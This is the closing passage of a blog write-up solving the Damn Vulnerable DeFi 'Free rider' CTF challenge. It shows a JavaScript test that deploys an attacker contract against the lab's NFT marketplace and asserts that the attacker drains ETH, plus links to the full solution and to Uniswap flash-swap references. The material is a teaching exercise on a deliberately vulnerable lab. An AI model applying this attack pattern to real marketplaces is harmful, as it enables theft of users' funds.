</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">attack</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackFreeRider&#39;</span>, <span style="color:#000">attacker</span>))
</span></span><span style="display:flex;"><span>            .<span style="color:#000">deploy</span>(<span style="color:#000">NFT_PRICE</span>, <span style="color:#00f">this</span>.<span style="color:#000">uniswapFactory</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">marketplace</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">address</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">buyerContract</span>.<span style="color:#000">address</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">expect</span>(<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)).<span style="color:#000">to</span>.<span style="color:#000">be</span>.<span style="color:#000">gt</span>(<span style="color:#000">MARKETPLACE_INITIAL_ETH_BALANCE</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
</div>
</div></p>
<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/free-rider/free-rider.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackFreeRider.sol" target="_blank" rel="noopener noreffer ">here</a>.</p>
<h2 id="4-references">4) References</h2>
<ul>
<li><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps" target="_blank" rel="noopener noreffer ">Uniswap v2 - Flash Swaps</a></li>
<li><a href="https://uniswap.org/whitepaper.pdf" target="_blank" rel="noopener noreffer ">Uniswap v2 Core</a></li>
<li><a href="https://eips.ethereum.org/EIPS/eip-721" target="_blank" rel="noopener noreffer ">EIP-721: Non-Fungible Token Standard</a></li>
</ul></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on October 17, 2022</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_10_free-rider/" data-title="Damn Vulnerable DeFi - Challenge #10 - Free rider" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_10_free-rider/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_10_free-rider/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/damnvulnerabledefi_09_puppetv2/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #9 - Puppet v2"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #9 - Puppet v2</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
